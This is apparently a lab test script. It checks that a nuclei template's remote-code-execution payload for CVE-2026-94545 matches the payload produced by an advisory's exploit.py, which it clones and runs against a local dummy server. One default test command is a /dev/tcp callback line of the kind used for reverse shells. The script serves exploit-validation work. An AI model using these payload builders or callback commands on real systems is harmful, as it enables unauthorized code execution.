#!/usr/bin/env bash
# Prove that the payload the template builds is byte-identical to the one the
# advisory's reference builder produces.
#
#   reference: exploit.py --command CMD --output FILE   (from EQSTLab/CVE-2026-94545)
#   template:  the JS builder inside CVE-2026-94545-rce.yaml, captured with
#              nuclei-shim.mjs --dump-requests
#
# A payload is not a fixed blob: it encodes the command, so equality has to be
# checked per command. Both sides are hashed and compared.
#
# Usage:
#   ./compare-payload.sh                        # uses $LAB_DIR/.upstream (cloned if needed)
#   ./compare-payload.sh --repo /path/to/clone  # local clone of the advisory repo
#   ./compare-payload.sh --command 'id' --command 'whoami'
set -uo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SHIM="$LAB_DIR/tools/nuclei-shim.mjs"
TEMPLATE="$LAB_DIR/../CVE-2026-94545-rce.yaml"
REPO_URL="https://github.com/EQSTLab/CVE-2026-94545.git"

REPO=""
COMMANDS=()

while [ $# -gt 0 ]; do
  case "$1" in
    --repo)    REPO="${2:?}"; shift 2 ;;
    --command) COMMANDS+=("${2:?}"); shift 2 ;;
    -h|--help) sed -n '2,17p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) echo "unknown option: $1" >&2; exit 2 ;;
  esac
done

# default cases: the short one, the callback shape the template uses by default,
# and the largest command the chain accepts
if [ "${#COMMANDS[@]}" -eq 0 ]; then
  COMMANDS=("id" "bash -c 'id>/dev/tcp/127.0.0.1/4444'" "$(python3 -c "print('A'*71)")")
fi

command -v python3 >/dev/null 2>&1 || { echo "python3 is required (runs the reference builder)" >&2; exit 1; }

# ------------------------------------------------------------------ repository
if [ -n "$REPO" ] && [ -f "$REPO/exploit.py" ]; then
  SRC="$REPO"
else
  SRC="$LAB_DIR/.upstream"
  if [ ! -f "$SRC/exploit.py" ]; then
    echo "cloning $REPO_URL"
    rm -rf "$SRC"
    git clone --depth 1 -q "$REPO_URL" "$SRC" || { echo "clone failed" >&2; exit 1; }
  fi
fi
[ -f "$SRC/exploit.py" ] || { echo "no exploit.py in $SRC" >&2; exit 1; }
echo "reference builder: $SRC/exploit.py"
echo "template:          $TEMPLATE"

# --------------------------------------------------------------- dummy target
# The template needs something that answers HTTP before it will build and send
# the payload; it never has to be vulnerable for this comparison.
PORT=$(( (RANDOM % 2000) + 23000 ))
python3 -m http.server --bind 127.0.0.1 "$PORT" >/dev/null 2>&1 &
SERVER_PID=$!
trap 'kill $SERVER_PID 2>/dev/null' EXIT
sleep 0.7
if ! curl -s -o /dev/null -m 3 "http://127.0.0.1:$PORT/"; then
  echo "could not start the dummy target on :$PORT" >&2
  exit 1
fi

WORK="$(mktemp -d)"
trap 'kill $SERVER_PID 2>/dev/null; rm -rf "$WORK"' EXIT

echo
printf '%-6s %-46s %-20s %-20s %s\n' 'case' 'command' 'exploit.py' 'template' 'result'
printf -- '-%.0s' {1..120}; echo

failures=0
i=0
for cmd in "${COMMANDS[@]}"; do
  i=$((i + 1))
  ref="$WORK/ref-$i.bin"
  dump="$WORK/dump-$i"

  python3 "$SRC/exploit.py" --target 127.0.0.1:1 --command "$cmd" --output "$ref" >/dev/null 2>&1 || {
    printf '%-6s %-46s %s\n' "$i" "$(printf '%.44s' "$cmd")" 'reference builder failed'
    failures=$((failures + 1))
    continue
  }

  node "$SHIM" "$TEMPLATE" "127.0.0.1:$PORT" --var safecheck=false --var "cmd=$cmd" \
    --dump-requests "$dump" --quiet >/dev/null 2>&1

  body="$(ls "$dump"/*POST.bin 2>/dev/null | head -1)"
  if [ -z "$body" ]; then
    printf '%-6s %-46s %s\n' "$i" "$(printf '%.44s' "$cmd")" 'template produced no payload'
    failures=$((failures + 1))
    continue
  fi

  ref_hash="$(sha256sum "$ref" | cut -d' ' -f1)"
  tpl_hash="$(sha256sum "$body" | cut -d' ' -f1)"
  if [ "$ref_hash" = "$tpl_hash" ]; then
    result="identical"
  else
    result="DIFFERENT"
    failures=$((failures + 1))
  fi
  printf '%-6s %-46s %-20s %-20s %s (%s B)\n' "$i" "$(printf '%.44s' "$cmd")" \
    "${ref_hash:0:16}" "${tpl_hash:0:16}" "$result" "$(stat -c%s "$ref")"
done

echo
if [ "$failures" -eq 0 ]; then
  echo "RESULT: every payload is byte-identical to the reference builder"
  exit 0
fi
echo "RESULT: $failures payload(s) differ - investigate before trusting the template"
exit 1
